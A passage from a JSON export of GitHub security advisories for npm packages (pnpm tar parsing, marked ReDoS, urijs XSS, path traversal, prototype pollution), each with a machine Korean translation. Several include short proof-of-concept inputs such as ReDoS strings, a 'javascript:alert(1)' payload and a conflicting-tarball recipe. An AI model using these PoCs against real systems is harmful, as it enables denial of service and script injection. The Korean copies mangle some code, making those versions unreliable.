z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/exe",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.33.4",
    "identifier": "7.33.4",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "pnpm",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.33.4",
    "identifier": "7.33.4",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Impact\nIt's possible for a user to pass a relative file path for the snapshot name and reach outside of the project directory into the machine running the test. Example:\n\n```js\n  cy.get('h1').matchImageSnapshot('../../../ignore-relative-dirs')\n```\nThe above will create an `ignore-relative-dirs.png` three levels up\n\n### Patches\nFixed in `8.0.2`\n\n### Workarounds\nValidate all the existing uses of `matchImageSnapshot` to ensure correct use of the filename argument. Example:\n\n```js\n    // snapshot name will be the test title\n    cy.matchImageSnapshot();\n\n    // snapshot name will be the name passed in\n    cy.matchImageSnapshot('login');\n```\n\n### References\nhttps://github.com/simonsmith/cypress-image-snapshot/issues/15\n",
    "identifiers": "GHSA : GHSA-vxjg-hchx-cc4g\nCVE : CVE-2023-38695",
    "severity": "MODERATE",
    "updatedAt": "2023-08-04T18:41:48Z",
    "publishedAt": "2023-08-01T16:59:40Z",
    "references": "https://github.com/simonsmith/cypress-image-snapshot/security/advisories/GHSA-vxjg-hchx-cc4g\nhttps://github.com/simonsmith/cypress-image-snapshot/issues/15\nhttps://github.com/simonsmith/cypress-image-snapshot/commit/ef49519795daf5183f4fac6f3136e194f20f39f4\nhttps://github.com/simonsmith/cypress-image-snapshot/releases/tag/8.0.2\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-38695\nhttps://github.com/advisories/GHSA-vxjg-hchx-cc4g",
    "name": "@simonsmith/cypress-image-snapshot",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 8.0.1",
    "identifier": "8.0.2",
    "descriptionKR": "### 영향\n사용자가 스냅샷 이름에 대한 상대 파일 경로를 전달하고 프로젝트 디렉터리 외부에서 테스트를 실행하는 시스템에 도달할 수 있습니다. 예:\n\n```js\n  cy.get('h1').matchImageSnapshot('../../../ignore-relative-dirs')\n```\n위의 세 단계 위로 `ignore-relative-dirs.png`가 생성됩니다.\n\n### 패치\n`8.0.2`에서 수정됨\n\n### 해결 방법\n파일 이름 인수를 올바르게 사용하려면 'matchImageSnapshot'의 기존 사용을 모두 확인하세요. 예:\n\n```js\n    // 스냅샷 이름이 테스트 제목이 됩니다.\n    cy.matchImageSnapshot();\n\n    // 스냅샷 이름은 전달된 이름이 됩니다.\n    cy.matchImageSnapshot('로그인');\n```\n\n### 참조\nhttps://github.com/simonsmith/cypress-image-snapshot/issues/15"
  },
  {
    "description": "fs-git is a file system like api for git repository. The fs-git version 1.0.1 module relies on child_process.exec, however, the buildCommand method used to construct exec strings does not properly sanitize data and is vulnerable to command injection across all methods that use it and call exec.",
    "identifiers": "GHSA : GHSA-wp3j-gv53-4pg8\nCVE : CVE-2017-1000451",
    "severity": "HIGH",
    "updatedAt": "2023-07-31T22:09:52Z",
    "publishedAt": "2022-05-13T01:41:14Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2017-1000451\nhttps://nodesecurity.io/advisories/360\nhttps://github.com/vvakame/fs-git/commit/eb5f70efa5cfbff1ab299fa7daaa5de549243998\nhttps://github.com/advisories/GHSA-wp3j-gv53-4pg8",
    "name": "fs-git",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.2",
    "identifier": "1.0.2",
    "descriptionKR": "fs-git은 git 저장소용 api와 같은 파일 시스템입니다. fs-git 버전 1.0.1 모듈은 child_process.exec에 의존하지만 exec 문자열을 구성하는 데 사용되는 buildCommand 메서드는 데이터를 적절하게 삭제하지 않으며 이를 사용하고 exec를 호출하는 모든 메서드에서 명령 주입에 취약합니다."
  },
  {
    "description": "Cloudera HUE 3.9.0 and earlier allows remote attackers to enumerate user accounts via a request to `desktop/api/users/autocomplete`.",
    "identifiers": "GHSA : GHSA-rxfp-8jmr-xc95\nCVE : CVE-2016-4947",
    "severity": "MODERATE",
    "updatedAt": "2023-07-31T21:10:09Z",
    "publishedAt": "2022-05-17T02:56:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2016-4947\nhttp://2016.hack.lu/archive/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf\nhttps://web.archive.org/web/20210123183622/http://www.securityfocus.com/bid/93880\nhttps://github.com/advisories/GHSA-rxfp-8jmr-xc95",
    "name": "gethue",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 3.9.0",
    "descriptionKR": "Cloudera HUE 3.9.0 및 이전 버전에서는 원격 공격자가 `desktop/api/users/autocomplete`에 대한 요청을 통해 사용자 계정을 열거할 수 있습니다."
  },
  {
    "description": "### Impact\n\n_What kind of vulnerability is it?_\n\nDenial of service.\n\nThe regular expression `inline.reflinkSearch` may cause catastrophic backtracking against some strings.\nPoC is the following.\n\n```javascript\nimport * as marked from 'marked';\n\nconsole.log(marked.parse(`[x]: x\n\n\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](`));\n```\n\n_Who is impacted?_\n\nAnyone who runs untrusted markdown through marked and does not use a worker with a time limit.\n\n### Patches\n\n_Has the problem been patched?_\n\nYes\n\n_What versions should users upgrade to?_\n\n4.0.10\n\n### Workarounds\n\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nDo not run untrusted markdown through marked or run marked on a [worker](https://marked.js.org/using_advanced#workers) thread and set a reasonable time limit to prevent draining resources.\n\n### References\n\n_Are there any links users can visit to find out more?_\n\n- https://marked.js.org/using_advanced#workers\n- https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [marked](https://github.com/markedjs/marked)\n",
    "identifiers": "GHSA : GHSA-5v2h-r2cx-5xgj\nCVE : CVE-2022-21681",
    "severity": "HIGH",
    "updatedAt": "2023-07-28T22:38:18Z",
    "publishedAt": "2022-01-14T21:04:46Z",
    "references": "https://github.com/markedjs/marked/security/advisories/GHSA-5v2h-r2cx-5xgj\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-21681\nhttps://github.com/markedjs/marked/commit/8f806573a3f6c6b7a39b8cdb66ab5ebb8d55a5f5\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AIXDMC3CSHYW3YWVSQOXAWLUYQHAO5UX/\nhttps://github.com/advisories/GHSA-5v2h-r2cx-5xgj",
    "name": "marked",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.0.10",
    "identifier": "4.0.10",
    "descriptionKR": "### 영향\n\n_어떤 종류의 취약점입니까?_\n\n서비스 거부.\n\n정규 표현식 `inline.reflinkSearch`는 일부 문자열에 대해 치명적인 역추적을 유발할 수 있습니다.\nPoC는 다음과 같습니다.\n\n```자바스크립트\nimport * 'marked'에서 표시된 대로;\n\nconsole.log(marked.parse(`[x]: x\n\n\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\ \\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\ [\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[ \\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\ \\](\\\\[\\\\](`));\n```\n\n_누가 영향을 받습니까?_\n\n표시를 통해 신뢰할 수 없는 마크다운을 실행하고 시간 제한이 있는 작업자를 사용하지 않는 사람.\n\n### 패치\n\n_문제가 패치되었나요?_\n\n예\n\n_사용자는 어떤 버전으로 업그레이드해야 합니까?_\n\n4.0.10\n\n### 해결 방법\n\n_사용자가 업그레이드하지 않고 취약점을 수정하거나 치료할 수 있는 방법이 있습니까?_\n\n[worker](https://marked.js.org/using_advanced#workers) 스레드에서 표시 또는 실행 표시를 통해 신뢰할 수 없는 마크다운을 실행하지 말고 합리적인 시간 제한을 설정하여 리소스 소모를 방지하세요.\n\n### 참조\n\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\n\n- https://marked.js.org/using_advanced#workers\n- https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n* [marked](https://github.com/markedjs/marked)에서 이슈 열기"
  },
  {
    "description": "### Impact\n\n_What kind of vulnerability is it?_\n\nDenial of service.\n\nThe regular expression `block.def` may cause catastrophic backtracking against some strings.\nPoC is the following.\n\n```javascript\nimport * as marked from \"marked\";\n\nmarked.parse(`[x]:${' '.repeat(1500)}x ${' '.repeat(1500)} x`);\n```\n\n_Who is impacted?_\n\nAnyone who runs untrusted markdown through marked and does not use a worker with a time limit.\n\n### Patches\n\n_Has the problem been patched?_\n\nYes\n\n_What versions should users upgrade to?_\n\n4.0.10\n\n### Workarounds\n\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nDo not run untrusted markdown through marked or run marked on a [worker](https://marked.js.org/using_advanced#workers) thread and set a reasonable time limit to prevent draining resources.\n\n### References\n\n_Are there any links users can visit to find out more?_\n\n- https://marked.js.org/using_advanced#workers\n- https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [marked](https://github.com/markedjs/marked)\n",
    "identifiers": "GHSA : GHSA-rrrm-qjm4-v8hf\nCVE : CVE-2022-21680",
    "severity": "HIGH",
    "updatedAt": "2023-07-28T22:38:14Z",
    "publishedAt": "2022-01-14T21:04:41Z",
    "references": "https://github.com/markedjs/marked/security/advisories/GHSA-rrrm-qjm4-v8hf\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-21680\nhttps://github.com/markedjs/marked/commit/c4a3ccd344b6929afa8a1d50ac54a721e57012c0\nhttps://github.com/markedjs/marked/releases/tag/v4.0.10\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AIXDMC3CSHYW3YWVSQOXAWLUYQHAO5UX/\nhttps://github.com/advisories/GHSA-rrrm-qjm4-v8hf",
    "name": "marked",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.0.10",
    "identifier": "4.0.10",
    "descriptionKR": "### 영향\n\n_어떤 종류의 취약점입니까?_\n\n서비스 거부.\n\n정규식 `block.def`는 일부 문자열에 대해 치명적인 역추적을 유발할 수 있습니다.\nPoC는 다음과 같습니다.\n\n```자바스크립트\n가져오기 * \"marked\"에서 표시된 대로;\n\nMarked.parse(`[x]:${' '.repeat(1500)}x ${' '.repeat(1500)} x`);\n```\n\n_누가 영향을 받습니까?_\n\n표시를 통해 신뢰할 수 없는 마크다운을 실행하고 시간 제한이 있는 작업자를 사용하지 않는 사람.\n\n### 패치\n\n_문제가 패치되었나요?_\n\n예\n\n_사용자는 어떤 버전으로 업그레이드해야 합니까?_\n\n4.0.10\n\n### 해결 방법\n\n_사용자가 업그레이드하지 않고 취약점을 수정하거나 치료할 수 있는 방법이 있습니까?_\n\n[worker](https://marked.js.org/using_advanced#workers) 스레드에서 표시 또는 실행 표시를 통해 신뢰할 수 없는 마크다운을 실행하지 말고 합리적인 시간 제한을 설정하여 리소스 소모를 방지하세요.\n\n### 참조\n\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\n\n- https://marked.js.org/using_advanced#workers\n- https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n* [marked](https://github.com/markedjs/marked)에서 이슈 열기"
  },
  {
    "description": "hoek versions prior to 8.5.1, and 9.x prior to 9.0.3 are vulnerable to prototype pollution in the clone function. If an object with the __proto__ key is passed to clone() the key is converted to a prototype. This issue has been patched in version 9.0.3, and backported to 8.5.1. ",
    "identifiers": "GHSA : GHSA-c429-5p7v-vgjp\nCVE : CVE-2020-36604",
    "severity": "HIGH",
    "updatedAt": "2023-07-28T22:08:41Z",
    "publishedAt": "2022-09-25T00:00:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-36604\nhttps://github.com/hapijs/hoek/issues/352\nhttps://github.com/hapijs/hoek/commit/4d0804bc6135ad72afdc5e1ec002b935b2f5216a\nhttps://github.com/hapijs/hoek/commit/948baf98634a5c206875b67d11368f133034fa90\nhttps://github.com/advisories/GHSA-c429-5p7v-vgjp",
    "name": "@hapi/hoek",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 9.0.0, < 9.0.3",
    "identifier": "9.0.3",
    "descriptionKR": "8.5.1 이전의 hoek 버전과 9.0.3 이전의 9.x는 복제 기능의 프로토타입 오염에 취약합니다. __proto__ 키가 있는 객체가 clone()에 전달되면 키가 프로토타입으로 변환됩니다. 이 문제는 버전 9.0.3에서 패치되었으며 8.5.1로 백포트되었습니다."
  },
  {
    "description": "hoek versions prior to 8.5.1, and 9.x prior to 9.0.3 are vulnerable to prototype pollution in the clone function. If an object with the __proto__ key is passed to clone() the key is converted to a prototype. This issue has been patched in version 9.0.3, and backported to 8.5.1. ",
    "identifiers": "GHSA : GHSA-c429-5p7v-vgjp\nCVE : CVE-2020-36604",
    "severity": "HIGH",
    "updatedAt": "2023-07-28T22:08:41Z",
    "publishedAt": "2022-09-25T00:00:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-36604\nhttps://github.com/hapijs/hoek/issues/352\nhttps://github.com/hapijs/hoek/commit/4d0804bc6135ad72afdc5e1ec002b935b2f5216a\nhttps://github.com/hapijs/hoek/commit/948baf98634a5c206875b67d11368f133034fa90\nhttps://github.com/advisories/GHSA-c429-5p7v-vgjp",
    "name": "@hapi/hoek",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 8.5.1",
    "identifier": "8.5.1",
    "descriptionKR": "8.5.1 이전의 hoek 버전과 9.0.3 이전의 9.x는 복제 기능의 프로토타입 오염에 취약합니다. __proto__ 키가 있는 객체가 clone()에 전달되면 키는 프로토타입으로 변환됩니다. 이 문제는 버전 9.0.3에서 패치되었으며 8.5.1로 백포트되었습니다."
  },
  {
    "description": "A vulnerability was found in diff before v3.5.0, the affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks.",
    "identifiers": "GHSA : GHSA-h6ch-v84p-w6p9",
    "severity": "HIGH",
    "updatedAt": "2023-07-28T22:03:40Z",
    "publishedAt": "2019-06-13T18:58:54Z",
    "references": "https://github.com/kpdecker/jsdiff/commit/2aec4298639bf30fb88a00b356bf404d3551b8c0\nhttps://bugzilla.redhat.com/show_bug.cgi?id=1552148\nhttps://snyk.io/vuln/npm:diff:20180305\nhttps://www.npmjs.com/advisories/1631\nhttps://www.whitesourcesoftware.com/vulnerability-database/WS-2018-0590\nhttps://github.com/advisories/GHSA-h6ch-v84p-w6p9",
    "name": "diff",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.5.0",
    "identifier": "3.5.0",
    "descriptionKR": "v3.5.0 이전의 diff에서 취약점이 발견되었으며, 이 패키지의 영향을 받는 버전은 ReDoS(Regular Expression Denial of Service) 공격에 취약합니다."
  },
  {
    "description": "\\r, \\n and \\t characters in user-input URLs can potentially lead to incorrect protocol extraction when using npm package urijs prior to version 1.19.11.\n\nThis can lead to XSS when the module is used to prevent passing in malicious javascript: links into HTML or Javascript (see following example):\n````\nconst parse = require('urijs')\nconst express = require('express')\nconst app = express()\nconst port = 3000\n\ninput = \"ja\\r\\nvascript:alert(1)\"\nurl = parse(input)\n\nconsole.log(url)\n\napp.get('/', (req, res) => {\n if (url.protocol !== \"javascript:\") {res.send(\"<iframe src=\\'\" + input + \"\\'>CLICK ME!</iframe>\")}\n})\n\napp.listen(port, () => {\n console.log(`Example app listening on port ${port}`)\n})\n````",
    "identifiers": "GHSA : GHSA-3vjf-82ff-p4r3\nCVE : CVE-2022-1243",
    "severity": "HIGH",
    "updatedAt": "2023-07-28T21:56:00Z",
    "publishedAt": "2022-04-06T00:01:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-1243\nhttps://github.com/medialize/uri.js/commit/b0c9796aa1a95a85f40924fb18b1e5da3dc8ffae\nhttps://huntr.dev/bounties/8c5afc47-1553-4eba-a98e-024e4cc3dfb7\nhttps://github.com/advisories/GHSA-3vjf-82ff-p4r3",
    "name": "urijs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.19.11",
    "identifier": "1.19.11",
    "descriptionKR": "버전 1.19.11 이전의 npm 패키지 urijs를 사용하는 경우 사용자 입력 URL의 \\r, \\n 및 \\t 문자는 잠재적으로 잘못된 프로토콜 추출로 이어질 수 있습니다.\n\n악성 javascript: 링크를 HTML 또는 Javascript로 전달하는 것을 방지하기 위해 모듈을 사용할 때 이로 인해 XSS가 발생할 수 있습니다(다음 예 참조).\n````\nconst parse = require('urijs')\nconst 익스프레스 = 요구('익스프레스')\nconst 앱 = 익스프레스()\nconst 포트 = 3000\n\n입력 = \"ja\\r\\nvascript:경고(1)\"\nURL = 구문 분석(입력)\n\n콘솔.로그(url)\n\napp.get('/', (요청, 응답) => {\n if (url.protocol !== \"javascript:\") {res.send(\"<iframe src=\\'\" + input + \"\\'>클릭!</iframe>\")}\n})\n\napp.listen(포트, () => {\n console.log(`포트 ${port}에서 수신 대기하는 예제 앱`)\n})\n````"
  },
  {
    "description": "Prototype pollution vulnerability via `.parse()` in Plist allows attackers to cause a Denial of Service (DoS) and may lead to remote code execution.",
    "identifiers": "GHSA : GHSA-4cpg-3vgw-4877\nCVE : CVE-2022-22912",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-28T21:50:44Z",
    "publishedAt": "2022-02-18T00:00:33Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-22912\nhttps://github.com/TooTallNate/plist.js/issues/114\nhttps://github.com/TooTallNate/plist.js/pull/118\nhttps://github.com/TooTallNate/plist.js/commit/96e2303d059e6be0c9e0c4773226d14b4758de52\nhttps://github.com/advisories/GHSA-4cpg-3vgw-4877",
    "name": "plist",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.5",
    "identifier": "3.0.5",
    "descriptionKR": "Plist의 `.parse()`를 통한 프로토타입 오염 취약성은 공격자가 서비스 거부(DoS)를 유발하고 원격 코드 실행으로 이어질 수 있습니다."
  },
  {
    "description": "### Impact\nIf using affected versions to determine a URL's hostname, the hostname can be spoofed by using a backslash (`\\`) character as part of the scheme delimiter, e.g. `scheme:/\\hostname`. If the hostname is used in security decisions, the decision may be incorrect.\n\nDepending on library usage and attacker intent, impacts may include allow/block list bypasses, SSRF attacks, open redirects, or other undesired behavior.\n\nExample URL: `https:/\\expected-example.com/path`\nEscaped string: `https:/\\\\expected-example.com/path` (JavaScript strings must escape backslash)\n\nAffected versions incorrectly return no hostname. Patched versions correctly return `expected-example.com`. Patched versions match the behavior of other parsers which implement the [WHATWG URL specification](https://url.spec.whatwg.org/), including web browsers and [Node's built-in URL class](https://nodejs.org/api/url.html).\n\n### Patches\nVersion 1.19.6 is patched against all known payload variants.\n\n### References\nhttps://github.com/medialize/URI.js/releases/tag/v1.19.6 (fix for this particular bypass)\nhttps://github.com/medialize/URI.js/releases/tag/v1.19.4 (fix for related bypass)\nhttps://github.com/medialize/URI.js/releases/tag/v1.19.3 (fix for related bypass)\n[PR #233](https://github.com/medialize/URI.js/pull/233) (initial fix for backslash handling)\n\n### For more information\nIf you have any questions or comments about this advisory, open an issue in https://github.com/medialize/URI.js\n\n### Reporter credit\n[Yaniv Nizry](https://twitter.com/ynizry) from the CxSCA AppSec team at Checkmarx",
    "identifiers": "GHSA : GHSA-p6j9-7xhc-rhwp\nCVE : CVE-2021-27516",
    "severity": "HIGH",
    "updatedAt": "2023-07-28T21:44:02Z",
    "publishedAt": "2021-03-01T20:03:53Z",
